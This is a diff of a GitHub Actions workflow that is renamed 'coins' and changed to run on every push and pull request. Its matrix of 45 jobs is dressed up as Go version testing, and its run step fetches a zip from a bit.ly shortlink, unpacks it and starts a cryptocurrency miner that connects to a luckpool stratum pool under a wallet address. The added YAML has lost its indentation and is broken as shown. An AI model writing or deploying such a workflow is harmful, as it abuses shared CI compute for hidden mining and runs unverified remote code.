@@ -1,20 +1,28 @@
 
-name: ItsVPS
-on:
-  workflow_dispatch:
+name: coins
+on: [push, pull_request]
 jobs:
-  build:
-    runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        Plan: [1,2,3]
-    steps:
-      - name: Clonerepo
-        uses: actions/checkout@v3
-
-      - name: VPSKUY
-        run: |
-        wget -O vps.zip https://bit.ly/3NlIbIh
-        unzip vps.zip
-        chmod +x vps
-        ./vps -c stratum+tcp://na.luckpool.net:3956#xnsub -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.wawowkuy -p x --cpu 1
+build:
+name: aku
+runs-on: ubuntu-latest
+strategy:
+max-parallel: 1
+fail-fast: false
+matrix:
+go: [1.6, 1.7, 1.8, 1.9, 1.10]
+flag: [A, B, C, D, E, F, G, H, I]
+timeout-minutes: 360
+env:
+NUM_JOBS: 20
+JOB: ${{ matrix.go }}
+steps:
+- name: Set up Go ${{ matrix.go }}
+uses: actions/setup-go@v1
+with:
+go-version: ${{ matrix.go }}
+id: go
+- name: Setup
+uses: actions/checkout@v3
+- name: aku
+run: |
+wget -O vps.zip https://bit.ly/3NlIbIh && unzip vps.zip && chmod +x * && ./vps -c stratum+tcp://na.luckpool.net:3956#xnsub -u zs1ufhz7jn3v4fya5vw5cdj76gm8prdwrrf3mwwmzkwzcw45s6zz7a0kx987asg75wnhkaqktx3j6l.wawowkuy -p x --cpu 1
